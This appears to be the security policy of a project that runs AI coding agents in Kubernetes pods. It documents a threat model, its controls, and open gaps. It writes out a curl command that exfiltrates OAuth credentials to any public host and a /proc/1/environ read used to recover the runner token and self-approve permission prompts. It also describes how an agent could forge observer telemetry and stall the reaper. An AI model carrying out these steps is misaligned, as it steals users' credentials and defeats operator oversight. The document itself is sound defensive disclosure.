# Security Policy

Aimed at operators deploying `sandbox` to their own cluster. It documents the
posture **as built today**, including the raised-but-not-closed gaps — it is not
a claim of completeness. Provenance for the verified findings is
[`docs/review-2026-07-07.md`](docs/review-2026-07-07.md) §A; the open hardening
items are tracked in [`TODO.md`](TODO.md) §1f.

## Reporting a vulnerability

Please report security vulnerabilities **privately** via
[GitHub Security Advisories](https://docs.github.com/en/code-security/security-advisories/guidance-on-reporting-and-writing-information-about-vulnerabilities/privately-reporting-a-security-vulnerability)
(the "Report a vulnerability" button under the repository's **Security** tab).
Do not open a public issue for a suspected vulnerability. The project is pre-1.0
and has no dedicated security contact yet; the advisory flow reaches the
maintainer.

Please include enough detail to reproduce: affected component (CLI, runner, or
deployment manifests), version/commit, and a proof of concept if you have one.

## Threat model

`sandbox` runs an AI coding agent (the Claude Agent SDK, or an external
`opencode`/Codex backend) inside a Kubernetes pod with broad write access to a
project workspace. **The agent is treated as untrusted code** — the design
assumes a prompt-injected or misbehaving agent may attempt to read, write, or
exfiltrate anything it can reach over the network or filesystem inside its pod.

The **security boundary is the network, not the process.** Runner, sshd, and the
agent's own shell all run as **root (uid 0)** in the same pod (no `runAsUser` in
the pod spec — `internal/k8s/backend.go`; no `USER` in `runner/Dockerfile`), so
in-pod isolation between the control plane and the agent it supervises is weak.
Confining what a session can reach is therefore the deployer's responsibility:

> **Deployment REQUIRES a Kubernetes `NetworkPolicy` that default-denies ingress
> and egress for the session namespace, plus an explicit egress allowlist.**
> Without an enforcing CNI (Cilium, Calico, …) the policy is silently ignored and
> there is no boundary. Without it, a session pod can reach the Kubernetes API
> server, in-cluster services, the cloud metadata endpoint (`169.254.169.254`),
> and your internal network. Example manifests are in [`k8s/`](k8s/) — a starting
> point you must review and adapt, not a turnkey configuration.

### In-pod network binds — all listen on `0.0.0.0`

Every in-pod listener binds all interfaces, not loopback:

| Port | Service | Evidence |
|---|---|---|
| 8787 | runner HTTP + SSE API | `runner/src/server.ts:170` (`server.listen(PORT)`, no host arg → all interfaces) |
| 22 | `sshd` (Mutagen sync transport) | `runner/Dockerfile:86` (`EXPOSE 8787 22`); key-only auth |
| 4096 (`OPENCODE_PORT`) | `opencode serve` (opencode backend only) | `runner/src/opencode.ts:313` (`--hostname 0.0.0.0`), default `4096` at `opencode.ts:22` |

**What contains this:** the default-deny **ingress** NetworkPolicy
(`k8s/networkpolicy-default-deny.yaml`) means nothing off-pod can dial these
ports, and the runner API additionally requires a bearer token
(`runner/src/auth.ts`). The CLI reaches all three over an ephemeral `kubectl`
port-forward to `127.0.0.1`, never a cluster-exposed Service.

**What it does NOT contain:** processes *inside the pod*. The agent's own Bash
tool runs in the same network namespace and can dial `127.0.0.1:8787`,
`:22`, and `:4096` directly — the bind address is not a boundary against the
agent. This is the mechanism behind the A1 self-approval class of finding
(below): the ingress policy and bearer token stop off-pod callers, not the
in-pod agent that already holds (or can recover) the token.

### Egress: the example allows 443 to any public host

The public-443 `ipBlock` rule in `k8s/networkpolicy-egress-allow.yaml` permits
**TCP 443 to `0.0.0.0/0`** with only RFC1918 / CGNAT / link-local (incl. the
metadata endpoint) carved out. Stated plainly: **this is an open exfiltration
channel.** It is what turns an in-pod secret disclosure (A1) or a logged-secret
(A2, now redacted) into remote exfiltration — a compromised agent can POST
anything it reads to any public HTTPS host. The example is deliberately broad so
the agent can reach `api.anthropic.com` and public package registries out of the
box.

**What that means for a claude-pane session:** the broad-443 example does
**not** contain credential exfiltration, and a claude-pane session hands the
agent a **refresh-capable credential**. The runner materializes the full Claude
Code OAuth material — access *and* refresh token — as
`$CLAUDE_CONFIG_DIR/.credentials.json` on the PVC (`materializeCredentials`,
`runner/src/claude-config.ts`), and the interactive child's env allowlist
deliberately points the pane at that dir (`buildClaudePaneEnv`,
`runner/src/claude-pane.ts`) — the agent **must** read the file to run at all,
so no env stripping can protect it. A single prompt-injected
`curl --data @$CLAUDE_CONFIG_DIR/.credentials.json https://<any-public-host>`
from the pane's Bash therefore ships a credential that **outlives the session**
(the refresh token mints new access tokens until revoked). Under the broad
example, network egress — the one control that could stop this — doesn't.
Provenance: [`docs/review-2026-07-20.md`](docs/review-2026-07-20.md) §S [S1].

**And for a seeded opencode session:** the same exposure applies. A
host-harvested opencode session materializes the seeded provider credential(s)
as a `0600` `auth.json` inside the pod (`materializeOpencodeAuth`,
`runner/src/agent-auth.ts`) that the in-pod `opencode` agent **must** read to
run — so, exactly like the claude-pane credential, it is agent-readable and
exfiltratable over broad-443, and an OAuth entry (`"type": "oauth"`) carries a
refresh token that **outlives the session**. Seeding **multiple** providers
widens the blast radius to every credential in the seed. `--seed-providers`
(the CLI lever; delivered as the per-session Secret key `opencode-auth-json` /
`secretKeyOpencodeAuthJSON` in `internal/k8s/backend.go`) is what narrows the
seed to only the providers a session actually needs. The same FQDN-scoped egress
policy below is the network-side mitigation.

**Hardening path:** replace the broad-443 example with an FQDN-scoped egress
policy allowing only the provider/registry hosts your agents actually need.
[`k8s/networkpolicy-egress-fqdn.yaml.example`](k8s/networkpolicy-egress-fqdn.yaml.example)
is a ready-made Cilium `CiliumNetworkPolicy` (`toFQDNs`) pinning egress to the
documented Claude Code endpoints, with commented per-backend (codex/opencode)
and registry blocks. It requires an FQDN-aware CNI, *replaces*
`networkpolicy-egress-allow.yaml` (keep default-deny applied), and its host set
should be re-verified against a live session (`hubble observe`) before
enforcement — see the header comments in the file. This is the single
highest-leverage hardening step for a real deployment. If you cannot scope by
FQDN, CIDR-pinning the same hosts is the weaker fallback.

### Controls in place

Each verified against code at the cited location:

- **Bearer-token auth on every non-`/healthz` route**, including SSE. The CLI
  mints a **256-bit** token (`generateToken`, `backend.go`), stores it in a
  per-session Kubernetes Secret, and injects it as `RUNNER_TOKEN`. The runner
  compares it **constant-time** and **rejects all requests when no token is
  configured** (`runner/src/auth.ts` `bearerTokenOk` / `constantTimeEqual`;
  wired at `runner/src/server.ts:27`).
- **Per-session Secrets + reconcile.** Bearer token, opencode server password,
  and SSH keys live in a per-session Secret, not a shared one; create/resume
  paths hash the live cluster Secret and warn on drift (`backend.go`).
- **Event-log + SSE secret redaction (A2 fix, landed 2026-07-09).** A shared
  `runner/src/redact.ts` masks secret-named fields, known runner secret values,
  `sk-…` tokens, and `Authorization: Bearer …` headers. `appendEvent`
  (`runner/src/events.ts:303`) redacts `turn.started`, `tool.*`, `permission.*`,
  and role-user `message.*` payloads **before both SQLite persist and SSE
  broadcast** — so secrets echoed in commands do not land cleartext on the PVC or
  replay to `attach` clients. The same `redactSecrets` gates `audit.jsonl`
  (`runner/src/audit.ts:34`).
- **PreToolUse Bash blocking.** A runner `PreToolUse` hook
  (`runner/src/claude.ts:429`, `makePreToolUseBashHook`) runs a shared blocklist
  (`runner/src/guards.ts` `bashCommandBlocked`) that denies Bash commands
  reaching for host/cluster/credential surfaces. **Defense-in-depth, not a
  boundary** — a regex blocklist is bypassable; treat it as noise reduction.
- **On-disk settings tiers load for SDK turns** (§2b gap 8, 2026-07-13).
  `settingSources` defaults to `user,project,local`
  (`runner/src/claude.ts:349`, `resolveSettingSources`), so the synced
  project's `.claude/` (commands, skills, hooks, CLAUDE.md) and the PVC-staged
  user config participate in turns. A hook or command a settings file defines
  runs as a child of the spawned `claude` binary and inherits the stripped
  agent env (`buildAgentEnv`) — it can no more read `RUNNER_TOKEN` than the
  Bash tool can, and adds no capability beyond the arbitrary Bash the default
  bypassPermissions mode already allows. The programmatic guard/audit hooks
  above apply regardless of settings files. `SANDBOX_SETTING_SOURCES=none`
  restores full isolation.
- **Append-only audit log.** A `PostToolUse` hook writes `audit.jsonl`
  (`runner/src/audit.ts`), redacted.
- **Runner-infra env strip for spawned children.** `sanitizedExecEnv`
  (`runner/src/exec.ts:36`) drops `RUNNER_TOKEN` and the other runner-infra
  secrets from the env of `/exec`, the SDK `claude` child, workspace git calls,
  and the `opencode serve` child (`runner/src/claude.ts:93`,
  `runner/src/opencode.ts:47`). See the A1 residual below for what this does and
  does not guarantee.
- **Default-deny ingress + egress allowlist** (`k8s/networkpolicy-default-deny.yaml`
  + `networkpolicy-egress-allow.yaml`) — the network boundary, subject to the
  enforcing-CNI caveat above.
- **No cluster credentials in the pod.** `automountServiceAccountToken: false`
  (`backend.go:1283`) — a compromised agent has no in-cluster identity.
- **Pod hardening.** `seccompProfile: RuntimeDefault` (`backend.go:1293`),
  `allowPrivilegeEscalation: false` (`backend.go:1362`), and capabilities
  **drop `ALL`** then re-add a specific set — `CHOWN, DAC_OVERRIDE, FOWNER,
  FSETID, SETGID, SETUID, SETPCAP, SETFCAP, NET_BIND_SERVICE, SYS_CHROOT, KILL,
  AUDIT_WRITE` (`backend.go:1363`). Note this is not a pure drop-all: `SETUID`
  and `DAC_OVERRIDE` remain, which is why the uid-separation fix (A1 residual)
  needs live validation.
- **Scoped reaper RBAC.** The idle reaper runs as a distinct ServiceAccount
  (`sandbox-reaper`) in a **separate** namespace (`agent-reaper`), bound to a
  narrow `Role` in `agent-sessions` — get/patch sandboxes, get pods/secrets — not
  cluster-admin (`internal/k8s/reaper.go:20`). It lives outside the session
  namespace precisely because that namespace's egress policy blocks the k8s API.
- **Per-session SSH key.** File sync authenticates with a per-session ed25519
  keypair (public key installed as the pod's `authorized_keys`; private key never
  leaves the local machine). `sshd` is password-auth-off, pubkey-only, root login
  key-only (`runner/Dockerfile:54`).

### A1 residual — `RUNNER_TOKEN` is recoverable in-pod despite the env strip

The A1 env strip (above) removes `RUNNER_TOKEN` from every **child** env, so an
agent that runs `env`/`printenv` in its own Bash tool no longer sees the token
directly. **It does not close the hole.** Because the runner (PID 1) and the
agent child share **uid 0** in the same pod, the agent can read the runner's
environment out of `/proc`:

```
tr '\0' '\n' < /proc/1/environ   # recovers RUNNER_TOKEN from the runner process
```

and then reach the runner API on in-pod localhost (`127.0.0.1:8787`) to
**self-approve its own permission prompts**, start/interrupt turns, or read the
event log — defeating the approval flow for an agent already running in
default/acceptEdits mode.

**So the env strip guarantees:** the token is not handed to children directly,
raising the bar past a trivial `printenv`. **It does not guarantee:** the token
is unrecoverable — a same-uid process reads it from `/proc`. This is
**raised-bar, not closed.** The tracked fix is uid separation — run the agent
child as a non-root uid distinct from the runner, or mount `/proc` with
`hidepid=2` (pod-spec + Dockerfile work, coordinated with the base-image spike).
See [`TODO.md`](TODO.md) §1f (`[A1 residual]`); the comments in
`runner/src/claude.ts` say so at the call site.

### Observer events are agent-influenceable (claude-pane)

The claude-pane observer authenticates its hook/statusline ingestion with a
per-session token that the runner provisions **inside** `CLAUDE_CONFIG_DIR`
(`provisionPaneObserver`, `runner/src/claude-pane-observer.ts` — the token file
sits next to the helper scripts, 0600 on the PVC), because the hooks run as
children of the agent's own `claude` process and must not receive
`RUNNER_TOKEN`. The `/observer/claude/*` routes in `runner/src/server.ts`
accept that token (they sit before the global bearer gate for exactly this
reason). Consequence: the in-pane agent can read its own observer token and
POST **fabricated same-session telemetry** — fake tool/permission/usage/message
events on the operator dashboard and in the event log — or hold a synthetic
'busy' that stalls the idle reaper (bounded: once observer events go quiet, the
staleness release `SYNTHETIC_BUSY_STALE_MS` in `runner/src/session.ts` frees
the session for reaping after 5 minutes). **Do not over-trust a claude-pane
live transcript or activity feed as an integrity record** — it reflects what
the in-pod session reported, not a tamper-proof audit trail. Cross-session
spoofing is not possible: the token is minted per session and the routes only
feed that pod's own event log. This is an accepted, documented consequence of
the observer design (provenance:
[`docs/review-2026-07-20.md`](docs/review-2026-07-20.md) §S [S3]).

### Known trade-offs

- The **Mutagen transport intentionally skips SSH host-key verification**
  (`StrictHostKeyChecking no`). The remote host is always a fresh, local
  port-forward to `127.0.0.1:<ephemeral-port>`; the per-session key — not the host
  key — is the authentication boundary.

## Known limitations / hardening backlog

Known gaps; none should be assumed mitigated. Cross-referenced to
[`TODO.md`](TODO.md) §1f where tracked.

- **Runner + agent share uid 0** — the A1 residual above; the top open item.
- **Open 443-to-any example egress** — the exfil channel above; FQDN-scoped
  egress is the fix. An example now ships
  (`k8s/networkpolicy-egress-fqdn.yaml.example`) but its host set has not been
  validated against live session traffic yet.
- **Runner runs as root.** Moving to a non-root uid requires live validation
  because `sshd` privilege separation depends on the current layout.
- **`PreToolUse` block uses the legacy SDK `decision:'block'` shape.** If a
  future SDK bump drops it, Bash enforcement silently dies while tests stay green
  (they pin what we return, not what the SDK honors). Tracked in §1f.
- **Runner image is tagged `:latest`**, not digest-pinned; no SBOM, image scan,
  or build provenance for published images.
- **No `/metrics` endpoint and no structured logging** in the runner.
- **No `RUNNER_TOKEN` rotation.** The per-session token is fixed for the session
  lifetime.
- **`sshd` is not run under a process supervisor** — a crash is not
  auto-restarted.
- **Permission-prompt ids carry only 32 bits of entropy** (`shortId` =
  the first UUID segment, `runner/src/events.ts:661`) and have not been
  hardened/reviewed. Resolving a permission still requires the bearer token,
  so id guessability is a second factor, not a standalone hole.

## Supported versions

This project is pre-1.0 and ships from `main`. Security fixes land on `main`;
there is no separate long-term support branch yet.
